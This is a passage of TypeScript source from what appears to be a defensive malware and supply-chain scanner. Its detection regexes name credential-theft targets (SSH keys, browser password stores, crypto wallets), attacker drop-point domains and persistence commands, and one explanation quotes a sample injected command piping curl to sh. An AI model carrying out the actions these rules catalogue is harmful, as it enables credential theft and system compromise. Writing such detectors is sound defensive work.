    pattern: /\.ssh[\\/](?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys)|\.aws[\\/]credentials|\.npmrc\b|\.pypirc\b|\.git-credentials|\.docker[\\/]config\.json|\.kube[\\/]config|\/etc\/(?:shadow|sudoers)\b|Login Data\b|Local State\b|\bCookies\b[^\n]{0,40}(?:Chrome|Edge|Brave|Firefox)|(?:Chrome|Edge|Brave)[^\n]{0,60}\b(?:Login Data|Cookies|Web Data)\b|\bwallet\.dat\b|\bkeychain-db\b|\blogin\.keychain\b|\bExodus[\\/]exodus\.wallet|\bMetaMask\b[^\n]{0,60}(?:Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn)|discord[\\/]Local Storage|\bdQw4w9WgXcQ:|Telegram Desktop[\\/]tdata|\bloginusers\.vdf\b|\b(?:key4\.db|logins\.json)\b[^\n]{0,60}(?:Firefox|Mozilla|profile)|(?:Firefox|Mozilla)[^\n]{0,80}\b(?:key4\.db|logins\.json)\b/i,
    skipFiles: new RegExp(`${DOCS.source}|(^|/)\\.gitignore$|(^|/)\\.dockerignore$|(^|/)\\.npmignore$`, "i"),
    // Mentioning a path (a .gitignore entry, a list of files to protect) is fine; reading, copying or sending it nearby is not.
    accept: (_m, lines, i) => lines.slice(Math.max(0, i - 2), i + 3).some(l => READS.test(l)),
    why: "Malicious packages commonly read SSH keys, cloud credentials, npm tokens, browser password stores and crypto wallets, then send them to the attacker.",
    message: m => `Reads sensitive credentials: ${truncate(m, 60)}`,
  },
  {
    id: "exfil-endpoint", title: "Sends data to a drop point used by attackers", severity: "high",
    pattern: /discord(?:app)?\.com\/api\/webhooks\/|api\.telegram\.org\/bot|\bhooks\.slack\.com\/services\/|\bwebhook\.site\/|\b(?:requestbin|pipedream)\.(?:net|com)\b|\b[\w-]+\.(?:ngrok(?:-free)?\.(?:io|app)|oast\.(?:fun|me|pro|live|site|online)|burpcollaborator\.net|interact\.sh|requestcatcher\.com|canarytokens\.com)\b|\bpastebin\.com\/(?:api|raw)\b|\btransfer\.sh\b|\bfile\.io\b|\banonfiles\.com\b|\b(?:dnslog\.cn|ceye\.io|interactsh\.com|beeceptor\.com|hookbin\.com|paste\.ee|hastebin\.com|0x0\.st|bashupload\.com|gofile\.io|catbox\.moe|filebin\.net|trycloudflare\.com)\b/i,
    skipFiles: DOCS,
    why: "Webhooks, chat bots, tunnels and paste sites are favourite places for stolen data to be sent, because they need no server of the attacker's own.",
    message: m => `Sends data to ${truncate(m, 60)}`,
  },
  {
    id: "env-exfil", title: "Collects all environment variables", severity: "high",
    pattern: /JSON\.stringify\s*\(\s*process\.env\s*\)|\bObject\.(?:entries|keys|values)\s*\(\s*process\.env\s*\)[^\n]{0,80}(?:fetch|https?\.request|axios|post|send|write)|\b(?:dict\s*\(\s*os\.environ\s*\)|json\.dumps\s*\(\s*(?:dict\s*\()?\s*os\.environ)|\bGet-ChildItem\s+env:[^\n]{0,80}(?:Invoke-WebRequest|iwr|Invoke-RestMethod)|\bprintenv\b[^\n]{0,40}\|\s*(?:curl|wget|nc)\b|\benv\b\s*\|\s*(?:curl|wget|nc)\b/i,
    why: "Environment variables hold API keys, tokens and passwords. Bundling all of them up, rather than reading one named setting, is the tell-tale step before sending them away.",
    message: m => `Collects every environment variable: ${truncate(m, 60)}`,
  },

  // ---- Persistence, defence evasion, privilege ----
  {
    id: "persistence", title: "Installs itself to run again later", severity: "high",
    pattern: /\bcrontab\s+(?:-l\b[^\n]{0,40}\||-\s*$|[^\n]*<<)|\(\s*crontab\s+-l|\bschtasks(?:\.exe)?\s+\/create\b|\\(?:CurrentVersion)\\Run(?:Once)?\b|\bHKCU:?\\[^\n]*\\Run\b|\bLaunchAgents\/[^\n]*\.plist|>>\s*~?\/?(?:\$HOME\/|~\/)?\.(?:bashrc|zshrc|profile|bash_profile)\b|\bsystemctl\s+enable\b[^\n]{0,60}--now|\bNew-ScheduledTask\w*|\bRegister-ScheduledTask\b|\/etc\/rc\.local\b|\bStartup\\[^\n]*\.(?:lnk|bat|vbs|exe)\b|>>\s*["']?\S*\.ssh\/authorized_keys|\/etc\/ld\.so\.preload\b|\bnet(?:\.exe)?\s+user\s+\S+\s+\S+\s+\/add\b|\bnet(?:\.exe)?\s+localgroup\s+administrators\s+\S+\s+\/add\b|\buseradd\b[^\n]*\s-u\s*0\b|>>\s*\/etc\/(?:passwd|sudoers)\b/i,
    skipFiles: DOCS,
    why: "Adding itself to cron, scheduled tasks, startup folders, the registry Run key or shell start-up files, or adding an SSH key or admin account, lets an attacker survive reboots and come back at will.",
    message: m => `Sets up automatic start-up: ${truncate(m, 70)}`,
  },
  {
    id: "disable-defences", title: "Turns off security protections", severity: "critical",
    pattern: /\bSet-MpPreference\b[^\n]*-Disable\w*\s+\$?true|\bAdd-MpPreference\b[^\n]*-Exclusion\w*|\bnetsh\s+(?:adv)?firewall\s+set\s+[^\n]*state\s+off|\bsetenforce\s+0\b|\bufw\s+disable\b|\bsystemctl\s+(?:stop|disable)\s+(?:firewalld|apparmor|auditd)|\bspctl\s+--master-disable\b|\bcsrutil\s+disable\b|\bwevtutil\s+cl\b|\bClear-EventLog\b|\bhistory\s+-c\b[^\n]*&&|\bunset\s+HISTFILE\b/i,
    skipFiles: DOCS,
    why: "Disabling antivirus, the firewall or audit logging, or wiping logs and shell history, is what malware does to avoid being caught. Normal software has no reason to.",
    message: m => `Disables security or erases traces: ${truncate(m, 70)}`,
  },
  {
    id: "hidden-powershell", title: "Hidden or encoded PowerShell", severity: "critical",
    pattern: /\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,80}\s-(?:e|en|enc|enco|encod|encode|encoded|encodedc\w*)\s+[A-Za-z0-9+/=]{20,}|\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,120}-(?:w|win|window|windowstyle)\s+h(?:idden)?\b[^\n]{0,120}-(?:nop|noprofile|ep|exec\w*\s+bypass)|\[(?:System\.)?Convert\]::FromBase64String\([^)]*\)[^\n]{0,80}(?:iex|Invoke-Expression|\.Invoke\(|Assembly\]::Load)/i,
    why: "Encoded commands and hidden PowerShell windows are used to run instructions the user can't see or read, a hallmark of Windows malware droppers.",
    message: m => `Hidden PowerShell command: ${truncate(m, 70)}`,
  },
  {
    id: "insecure-tls", title: "Turns off HTTPS certificate checks", severity: "medium",
    pattern: /NODE_TLS_REJECT_UNAUTHORIZED\s*[=:]\s*['"]?0|rejectUnauthorized\s*:\s*false|\bverify\s*=\s*False\b|InsecureSkipVerify\s*:\s*true|ServerCertificateValidationCallback\s*=\s*\{?\s*(?:\([^)]*\)|\w+)\s*=>\s*true|\bcurl\b[^\n]*\s(?:-k|--insecure)\b|\bwget\b[^\n]*--no-check-certificate/i,
    skipFiles: DOCS,
    why: "Without certificate checks, anyone on the network can intercept and change the traffic, including swapping a downloaded file for malware.",
    message: m => `Certificate checks disabled: ${truncate(m, 60)}`,
  },

  // ---- Obfuscation signals ----
  {
    id: "char-code-obfuscation", title: "Text built from character codes", severity: "high",
    pattern: /String\.fromCharCode\s*\(\s*(?:\d{2,3}\s*[,)]\s*){12,}|\bchr\s*\(\s*\d{2,3}\s*\)(?:\s*\+\s*chr\s*\(\s*\d{2,3}\s*\)){10,}|\[char\]\s*\d{2,3}(?:\s*\+\s*\[char\]\s*\d{2,3}){10,}/i,
    skipFiles: MINIFIED,
    why: "Spelling out text one character code at a time hides words like URLs and commands from people and from text searches. It is a common obfuscation step.",
    message: () => "Long string assembled from character codes.",
  },
  {
    id: "hex-escapes", title: "Long hex-escaped string", severity: "medium",
    pattern: /(?:\\x[0-9a-fA-F]{2}){24,}|(?:\\u00[0-9a-fA-F]{2}){24,}/,
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(json|map|svg)$`, "i"),
    why: "A long run of \\x escapes usually hides readable text or machine code. Check what it decodes to.",
    message: m => `Hex-escaped data (${Math.round(m.length / 4)} bytes).`,
  },
  {
    id: "base64-blob", title: "Large encoded blob in source code", severity: "medium",
    pattern: /['"`][A-Za-z0-9+/]{300,}={0,2}['"`]/,
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(json|map|svg|css|scss|less|html?|md|txt|pem|crt|cer|xml|ipynb|snap)$`, "i"),
    why: "Large base64 strings in code can be harmless (an embedded image or font), but they are also how payloads are smuggled past reviewers. Check what it decodes to.",
    message: m => `Encoded blob of ${m.length - 2} characters.`,
  },
  {
    id: "raw-ip-url", title: "Connects to a bare IP address", severity: "medium",
    pattern: /\b(?:https?|ftp|wss?|tcp):\/\/(?!(?:127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|localhost))(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/i,
    skipFiles: new RegExp(`${DOCS.source}|${LOCKFILES.source}`, "i"),
    why: "Real services use domain names. A hard-coded public IP address often points at an attacker's server, chosen so it doesn't show up in DNS logs.",
    message: m => `Hard-coded server address ${m}`,
  },

  // ---- Leaked secrets ----
  {
    id: "secret", title: "Secret key or token in the code", severity: "high",
    pattern: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b|\bgh[pousr]_[A-Za-z0-9]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{60,}\b|-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----|\bxox[baprs]-[A-Za-z0-9-]{10,}\b|\bsk_live_[A-Za-z0-9]{20,}\b|\brk_live_[A-Za-z0-9]{20,}\b|\bAIza[0-9A-Za-z_-]{35}\b|\bglpat-[A-Za-z0-9_-]{20,}\b|\bnpm_[A-Za-z0-9]{36}\b|\bsk-(?:proj-|ant-)?[A-Za-z0-9_-]{32,}\b|\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/,
    skipFiles: LOCKFILES,
    accept: (m, lines, i) => {
      // A private key header only counts with key data after it; a header on its own is just a string.
      if (m.startsWith("-----BEGIN")) return /^[A-Za-z0-9+/=]{40,}\s*$/.test((lines[i + 1] ?? "").trim()) || /-----\s*\\n[A-Za-z0-9+/=]{40,}/.test(lines[i]);
      return !FAKE_SECRET.test(m) && longestRun(m) < 8 && entropy(m.replace(/^(?:AKIA|ASIA|gh[pousr]_|github_pat_|xox[baprs]-|sk_live_|rk_live_|AIza|glpat-|npm_|sk-(?:proj-|ant-)?|SG\.)/, "")) >= 3.2;
    },
    why: "Keys committed to code can be copied by anyone who can read the repository, including from its history after deletion. Revoke the key and load it from a secret store instead.",
    message: m => `Possible secret: ${m.slice(0, 6)}… (${m.length} characters). Revoke it if it's real.`,
  },

  // ---- Package and pipeline hijacking ----
  {
    id: "install-script", title: "Install script that runs on npm install", severity: "critical",
    files: /(^|\/)package\.json$/i,
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /"(preinstall|install|postinstall|preuninstall|postuninstall|prepare|prepublish)"\s*:\s*"([^"]*)"/.exec(line);
        if (!m) return;
        const [, hook, cmd] = m;
        if (/\b(curl|wget|powershell|pwsh|iwr|Invoke-WebRequest|bash\s+-c|sh\s+-c|node\s+-e|python\s+-c|eval|base64|https?:\/\/|\|\s*(?:ba)?sh)\b/i.test(cmd))
          out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${hook}" runs a download or inline code on install: ${truncate(cmd, 80)}` });
      });
      return out;
    },
    why: "npm runs install scripts automatically on every machine that installs the package, including CI servers. Most supply-chain attacks start here.",
  },
  {
    id: "install-hook", title: "Runs code automatically on npm install", severity: "low",
    files: /(^|\/)package\.json$/i,
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /"(preinstall|install|postinstall)"\s*:\s*"([^"]*)"/.exec(line);
        if (m && !/\b(curl|wget|powershell|pwsh|iwr|Invoke-WebRequest|bash\s+-c|sh\s+-c|node\s+-e|python\s+-c|eval|base64|https?:\/\/)\b/i.test(m[2]))
          out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${m[1]}" runs "${truncate(m[2], 60)}" on every install. Check that script.` });
      });
      return out;
    },
    why: "Install hooks run without anyone asking. They are often legitimate (building native code), but they are worth a look in every new dependency.",
  },
  {
    id: "workflow-injection", title: "GitHub workflow runs untrusted text as a command", severity: "high",
    files: /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i,
    pattern: /\$\{\{\s*github\.(?:event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label)|comment\.body|review\.body|review_comment\.body|pages\.\S*\.page_name|commits\.\S*\.(?:message|author\.(?:name|email))|head_commit\.(?:message|author\.(?:name|email))|discussion\.(?:title|body)|workflow_run\.head_branch)|head_ref)\s*\}\}/,
    why: "Anyone who can open an issue or pull request controls this text. Put straight into a run: step, a title like `\"; curl evil.sh | sh #` runs as a command on your CI with your secrets. Pass it through an environment variable instead.",
    message: m => `Untrusted value in a workflow: ${m}`,
  },
  {
    id: "workflow-pr-target", title: "pull_request_target checks out untrusted code", severity: "critical",
    files: /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i,
    check: (lines) => {
      const text = lines.join("\n");
      if (!/\bpull_request_target\b/.test(text)) return [];
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        if (/ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)|ref:\s*refs\/pull\/|github\.head_ref/.test(line))
          out.push({ line: i + 1, column: line.search(/\S/) + 1, length: line.trim().length, message: "Checks out the pull request's own code in a pull_request_target workflow, which has write access and secrets." });
      });
      return out;
    },
    why: "pull_request_target runs with your repository's secrets and write access. Checking out and running the pull request's code there lets any outsider's pull request steal those secrets.",
  },

  // ---- Supply chain: the packages a project pulls in ----
  {
    id: "typosquat-package", title: "Package name one letter away from a popular one", severity: "high",
    files: /(^|\/)(package\.json|requirements[\w.-]*\.txt|Pipfile|pyproject\.toml)$/i,
    check: (lines, path) => {
      const python = !/package\.json$/i.test(path);
      const popular = python ? POPULAR_PYPI : POPULAR_NPM;
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      const npmDeps = python ? undefined : dependencyLines(lines);
      lines.forEach((line, i) => {
        if (npmDeps && !npmDeps.has(i)) return;
        const name = dependencyName(line, path);
        if (!name) return;
        const lower = name.toLowerCase().replace(/_/g, "-");
        if (popular.has(lower) || REAL_NEIGHBOURS.has(lower)) return;
        const near = [...popular].find(p => p.length >= 4 && Math.abs(p.length - lower.length) <= 1 && editDistance(p, lower) === 1);
        if (near) out.push({ line: i + 1, column: line.indexOf(name) + 1, length: name.length, message: `"${name}" is one letter away from the popular package "${near}".` });
      });
      return out;
    },
    why: "Attackers publish packages with names one typo away from popular ones (expres, reqeusts) so a slip of the keyboard installs their malware. It is one of the most common supply-chain attacks.",
  },
  {
    id: "remote-dependency", title: "Dependency installed from a URL or git, not the registry", severity: "medium",
    files: /(^|\/)(package\.json|requirements[\w.-]*\.txt)$/i,
    check: (lines, path) => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      const npm = /package\.json$/i.test(path), deps = npm ? dependencyLines(lines) : undefined;
      lines.forEach((line, i) => {
        if (deps && !deps.has(i)) return;
        const m = npm ? /"([@\w./-]+)"\s*:\s*"((?:https?:|git\+|git:|github:|gitlab:|bitbucket:)[^"]*)"/.exec(line) : /^\s*((?:git\+|https?:)\S+)/.exec(line);
        if (m) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `${npm ? `"${m[1]}" comes` : "This package comes"} from ${truncate(npm ? m[2] : m[1], 70)} instead of the package registry.` });
      });
      return out;
    },
    why: "Code fetched from a URL or a git repository skips the registry's checks and can change at any time without a new version, so what you reviewed may not be what gets installed.",
  },
  {
    id: "dependency-confusion", title: "Extra package source that can be hijacked", severity: "high",
    files: /(^|\/)(requirements[\w.-]*\.txt|pip\.conf|\.npmrc|\.yarnrc(\.yml)?)$/i,
    pattern: /--extra-index-url\s+\S+|--index-url\s+http:\/\/\S+|--trusted-host\s+\S+|^\s*registry\s*=\s*http:\/\/\S+|npmRegistryServer:\s*["']?http:\/\/\S+|^\s*always-auth\s*=\s*false/im,
    why: "With an extra package index, pip installs whichever source has the higher version, so an attacker can publish a public package with your private package's name and get it installed (dependency confusion). Plain http sources can be tampered with in transit.",
    message: m => `Package source: ${truncate(m, 70)}`,
  },
  {
    id: "unpinned-dependency", title: "Dependency with no version limit", severity: "low",
    files: /(^|\/)package\.json$/i,
    check: lines => {
      const deps = dependencyLines(lines);
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /"([@\w./-]+)"\s*:\s*"(\*|latest|x|)"/.exec(line);
        if (m && deps.has(i)) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${m[1]}" has no version limit ("${m[2]}").` });
      });
      return out;
    },
    why: "\"*\" or \"latest\" installs whatever version is newest on the day, including a malicious one published by a hijacked account. Pin a version range you have reviewed.",
  },
];

// The most installed packages, for spotting look-alike names. Names that are popular in their own right aren't flagged.
const POPULAR_NPM = new Set(["react", "react-dom", "express", "lodash", "axios", "chalk", "commander", "request", "moment", "debug", "typescript", "webpack", "eslint", "prettier", "jest", "mocha", "vue", "angular", "jquery", "underscore", "async", "bluebird", "uuid", "dotenv", "cors", "body-parser", "mongoose", "sequelize", "socket.io", "nodemon", "yargs", "inquirer", "colors", "redis", "mysql", "mysql2", "jsonwebtoken", "bcrypt", "bcryptjs", "multer", "passport", "cheerio", "puppeteer", "electron", "rxjs", "tslib", "classnames", "prop-types", "styled-components", "tailwindcss", "vite", "rollup", "esbuild", "glob", "minimist", "semver", "fs-extra", "node-fetch", "cross-env", "rimraf", "mkdirp", "crypto-js", "discord.js", "ethers", "web3", "next", "nuxt", "svelte", "zod", "dayjs", "date-fns", "graphql", "apollo-server", "playwright", "cypress", "sharp", "nodemailer", "winston", "morgan", "helmet", "chokidar", "ioredis", "knex", "prisma", "openai", "stripe", "firebase", "aws-sdk", "pg", "ws"]);
const POPULAR_PYPI = new Set(["requests", "numpy", "pandas", "django", "flask", "urllib3", "setuptools", "boto3", "botocore", "scipy", "matplotlib", "pillow", "cryptography", "pyyaml", "beautifulsoup4", "selenium", "tensorflow", "torch", "scikit-learn", "colorama", "python-dateutil", "jinja2", "sqlalchemy", "pytest", "fastapi", "uvicorn", "pydantic", "httpx", "aiohttp", "openai", "anthropic", "transformers", "psycopg2", "pymongo", "redis", "celery", "gunicorn", "paramiko", "pycryptodome", "openpyxl", "lxml", "click", "tqdm", "rich", "certifi", "idna", "six", "wheel", "pip", "docker", "kubernetes", "streamlit"]);

// Real, well-known packages that happen to be one letter from a popular one.
const REAL_NEIGHBOURS = new Set(["preact", "color", "uid", "boto", "nest", "vuex", "rxjs", "jsdom", "pino", "ky", "got", "yaml", "axe", "chai", "sinon", "redux", "ioredis", "execa", "globby", "lxml", "httpie", "attrs", "black", "mypy", "pytz", "tomli", "toml", "jsonschema", "esbuild-wasm", "vitest"]);

/** Line numbers (0-based) inside the dependency sections of a package.json. */
function dependencyLines(lines: string[]) {
  const inside = new Set<number>();
  let depth = 0, open = false;
  lines.forEach((line, i) => {
    if (!open && /"(?:dependencies|devDependencies|peerDependencies|optionalDependencies|overrides|resolutions)"\s*:\s*\{/.test(line)) { open = true; depth = 0; }
    if (!open) return;
    for (const c of line) { if (c === "{") depth++; else if (c === "}") depth--; }
    inside.add(i);
    if (depth <= 0) open = false;
  });
  return inside;
}

/** The package name declared on a line of package.json (inside a dependencies block) or a Python requirements file. */
function dependencyName(line: string, path: string): string | undefined {
  if (/package\.json$/i.test(path)) {
    const m = /^\s*"(@?[a-z0-9][\w.-]*(?:\/[\w.-]+)?)"\s*:\s*"[~^<>=*\d xX.|-]+[\w.-]*"\s*,?\s*$/i.exec(line);
    // Skip the package's own fields such as "version": "1.0.0".
    return m && !["version", "node", "npm", "vscode", "name", "license", "main", "types"].includes(m[1]) ? m[1] : undefined;
  }
  const m = /^\s*([A-Za-z0-9][A-Za-z0-9._-]*)\s*(?:\[[^\]]*\])?\s*(?:[=<>!~]=?|;|$|#)/.exec(line);
  return m && !line.trim().startsWith("-") ? m[1] : undefined;
}

/** Levenshtein distance, with a swap of two neighbouring letters counted as one edit. */
export function editDistance(a: string, b: string): number {
  const d = Array.from({ length: a.length + 1 }, (_, i) => [i, ...Array(b.length).fill(0)]);
  for (let j = 1; j <= b.length; j++) d[0][j] = j;
  for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) {
    d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    if (i > 1 && j > 1 && a[i - 1] === b[j - 2] && a[i - 2] === b[j - 1]) d[i][j] = Math.min(d[i][j], d[i - 2][j - 2] + 1);
  }
  return d[a.length][b.length];
}

// Storing or sending data: what turns reading the keyboard into a keylogger.
const SENDS = /\b(?:send\w*|post\s*\(|fetch\s*\(|requests\.|urllib|socket|smtplib|SMTP|WebClient|HttpClient|http\.request|axios|webhook\w*|upload\w*|ftp\w*|fwrite|fprintf|appendFile\w*|WriteAllText|AppendAllText|write\s*\()/i;
// Clipboard access, and crypto wallet addresses or the patterns that find them (Bitcoin, Ethereum, Monero).
const CLIPBOARD = /\b(?:clipboard\w*|pyperclip|GetClipboardData|SetClipboardData|OpenClipboard|xclip|xsel|pbcopy|pbpaste|Set-Clipboard|Get-Clipboard)\b/i;
const WALLET = /0x\[[a-fA-F0-9-]+\]\{40\}|\[13\]\[a-km-zA-HJ-NP-Z1-9\]|\bbc1q?\)?\[|\b(?:bc1q[02-9ac-hj-np-z]{38,58}|0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})\b/;
// Reading, copying or sending a file, in the common languages.
const READS = /\b(?:readFile\w*|readSync|createReadStream|read_to_string|read_text|read_bytes|open\s*\(|fopen|file_get_contents|File\.Read\w*|Get-Content|gc\s|cat\s|type\s|copyFile\w*|copy\s*\(|shutil\.copy\w*|cp\s|scp\s|upload\w*|send\w*|post\s*\(|fetch\s*\(|request\s*\(|axios|requests\.|urllib|zip\w*|tar\s|base64|exfil\w*|Compress-Archive|Invoke-WebRequest|iwr\s|curl\s|wget\s|ReadAll\w*|ioutil\.ReadFile|os\.ReadFile|Files\.read\w*|readlines?)\b/i;
// Sample values in docs and tests: AWS's documented example key, x-ed or repeated placeholders.
const FAKE_SECRET = /EXAMPLE|example|sample|dummy|fake|placeholder|your[_-]?(?:key|token)|x{6,}|X{6,}|0{8,}|(?:1234|abcd){2,}|(.)\1{9,}/;
/** Shannon entropy in bits per character: real keys are random (about 4+), placeholders are not. */
function entropy(s: string) {
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let h = 0; for (const n of counts.values()) { const p = n / s.length; h -= p * Math.log2(p); }
  return h;
}

/** Longest run of consecutive characters like "abcdef" or "987654": samples are typed that way, real keys never are. */
function longestRun(s: string) {
  let best = 1, up = 1, down = 1;
  for (let i = 1; i < s.length; i++) {
    const d = s.charCodeAt(i) - s.charCodeAt(i - 1);
    up = d === 1 ? up + 1 : 1; down = d === -1 ? down + 1 : 1;
    best = Math.max(best, up, down);
  }
  return best;
}

function truncate(s: string, n: number) { const v = visible(s.trim()); return v.length > n ? v.slice(0, n - 1) + "…" : v; }

/** Blank out string literals and comments so identifier checks only see code. Keeps column positions. */
export function stripStringsAndComments(line: string): string {
  return line
    // The two alternatives never overlap (an escape vs. any other character), so this can't backtrack badly.
    .replace(/(["'`])(?:\\.|(?!\1)[^\\])*\1/g, s => " ".repeat(s.length))
    .replace(/(\/\/|#(?!!)|--\s).*$/, s => " ".repeat(s.length))
    .replace(/\/\*.*?\*\//g, s => " ".repeat(s.length));
}

/** Lines can opt out with a comment: `veyra-guard-ignore` (all rules) or `veyra-guard-ignore: rule-id, rule-id`. */
function ignoredRules(line: string): Set<string> | "all" | undefined {
  const m = /veyra-guard-ignore(?::\s*([\w,\s-]+))?/.exec(line);
  if (!m) return undefined;
  return m[1] ? new Set(m[1].split(/[\s,]+/).filter(Boolean)) : "all";
}

export interface ScanOptions {
  /** Rule ids to skip. */
  disabled?: Iterable<string>;
  /** Only report these lines (1-based), e.g. the lines a pull request added. */
  onlyLines?: Set<number>;
  /** Lowest severity to report. */
  minSeverity?: Severity;
  /** A team's own patterns, from settings or .veyra-guard.json. */
  customRules?: CustomRule[];
}

/** A team's own rule: a regular expression checked on every line of matching files, in any language. */
export interface CustomRule {
  id: string;
  pattern: string;
  /** Regular expression flags; "i" (ignore case) by default. */
  flags?: string;
  severity?: Severity;
  title?: string;
  message?: string;
  why?: string;
  fix?: string;
  /** Only files matching these globs, such as "src/**" or "*.php". */
  files?: string | string[];
}

const CUSTOM_FIXES = new WeakMap<Rule, string>();
const compiled = new Map<string, { rules: Rule[]; errors: string[] }>();

/** Turn custom rules into scanner rules; rules with an invalid pattern are reported in errors and left out. */
export function compileCustomRules(list: CustomRule[]): { rules: Rule[]; errors: string[] } {
  if (!list.length) return { rules: [], errors: [] };
  const key = JSON.stringify(list);
  const cached = compiled.get(key);
  if (cached) return cached;
  const rules: Rule[] = [], errors: string[] = [];
  for (const c of list) {
    const id = String(c?.id ?? "").trim().replace(/[^\w-]+/g, "-");
    if (!id || typeof c.pattern !== "string" || !c.pattern) { errors.push(`A custom rule needs an "id" and a "pattern"${id ? ` (${id})` : ""}.`); continue; }
    let pattern: RegExp;
    try { pattern = new RegExp(c.pattern, (c.flags ?? "i").replace(/[^imsuy]/g, "")); } catch (e) { errors.push(`Custom rule "${id}" has an invalid pattern: ${(e as Error).message}`); continue; }
    if (pattern.test("")) { errors.push(`Custom rule "${id}" matches empty text, so it would flag every line.`); continue; }
    const severity = SEVERITIES.includes(c.severity as Severity) ? c.severity as Severity : "high";
    const files = c.files ? globMatcher(Array.isArray(c.files) ? c.files : [c.files]) : undefined;
    const rule: Rule = {
      id, title: c.title || `Custom rule: ${id}`, severity, pattern, custom: true,
      why: c.why || "Your team marked this pattern as something to review (a custom rule in settings or .veyra-guard.json).",
      message: m => c.message ? `${c.message} (${truncate(m, 50)})` : `Matches the custom rule "${id}": ${truncate(m, 60)}`,
    };
    if (files) rule.files = { test: files };
    CUSTOM_FIXES.set(rule, c.fix || "Follow your team's guidance for this pattern, or mark the line as reviewed.");
    rules.push(rule);
  }
  const result = { rules, errors };
  if (compiled.size > 20) compiled.clear();
  compiled.set(key, result);
  return result;
}

/** Glob-ish path filters: "docs/**", "*.md", "test/fixtures/**". A pattern without a slash also matches file names in any folder. */
export function globMatcher(patterns: string[]) {
  const res = patterns.map(p => p.trim().replace(/^\.\//, "")).filter(Boolean).map(p => new RegExp((p.includes("/") ? "^" : "(^|/)") + p.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*\*\/?/g, "__GLOBSTAR__").replace(/\*/g, "[^/]*").replace(/\?/g, "[^/]").replace(/__GLOBSTAR__/g, ".*") + "$"));
  return (path: string) => res.some(r => r.test(path.replace(/\\/g, "/")));
}

/** Settings a project keeps in .veyra-guard.json, read by the editor, the command line, the git hook and the GitHub Action. */
export interface GuardConfig {
  minSeverity?: Severity;
  failOn?: Severity | "never";
  disabledRules?: string[];
  ignorePaths?: string[];
  customRules?: CustomRule[];
}
export const CONFIG_FILE = ".veyra-guard.json";

/** Read .veyra-guard.json leniently: unknown or wrongly typed fields are dropped, comments are allowed. */
export function parseConfig(text: string): { config: GuardConfig; error?: string } {
  let raw: Record<string, unknown>;
  try { raw = JSON.parse(text.replace(/^﻿/, "").replace(/^\s*\/\/.*$/gm, "")); } catch (e) { return { config: {}, error: `${CONFIG_FILE} isn't valid JSON: ${(e as Error).message}` }; }
  if (!raw || typeof raw !== "object") return { config: {}, error: `${CONFIG_FILE} should contain an object.` };
  const strings = (v: unknown) => Array.isArray(v) ? v.filter((x): x is string => typeof x === "string") : undefined;
  const config: GuardConfig = {};
  if (SEVERITIES.includes(raw.minSeverity as Severity)) config.minSeverity = raw.minSeverity as Severity;
  if (raw.failOn === "never" || SEVERITIES.includes(raw.failOn as Severity)) config.failOn = raw.failOn as Severity | "never";
  if (strings(raw.disabledRules)) config.disabledRules = strings(raw.disabledRules);
  if (strings(raw.ignorePaths)) config.ignorePaths = strings(raw.ignorePaths);
  if (Array.isArray(raw.customRules)) config.customRules = raw.customRules as CustomRule[];
  const errors = config.customRules ? compileCustomRules(config.customRules).errors : [];
  return { config, error: errors.length ? errors.join(" ") : undefined };
}

// ---------- Languages ----------

const LANGUAGE_EXTENSIONS: Record<string, string> = {
  JavaScript: "js mjs cjs jsx", TypeScript: "ts mts cts tsx", Python: "py pyw pyi pyx ipynb", Java: "java", Kotlin: "kt kts", Scala: "scala sc", Groovy: "groovy gradle gvy",
  "C#": "cs csx", "F#": "fs fsx fsi", "Visual Basic": "vb bas cls frm vba", VBScript: "vbs vbe wsf", C: "c h", "C++": "cpp cc cxx c++ hpp hh hxx ino", "Objective-C": "m mm",
  Go: "go", Rust: "rs", Swift: "swift", Dart: "dart", Ruby: "rb rake gemspec erb", PHP: "php phtml php3 php4 php5 php7 phar", Perl: "pl pm t cgi", Lua: "lua luau", R: "r rmd",
  Julia: "jl", Elixir: "ex exs", Erlang: "erl hrl", Haskell: "hs lhs", OCaml: "ml mli", Clojure: "clj cljs cljc edn", Lisp: "lisp lsp el scm rkt", Nim: "nim", Zig: "zig", Crystal: "cr",
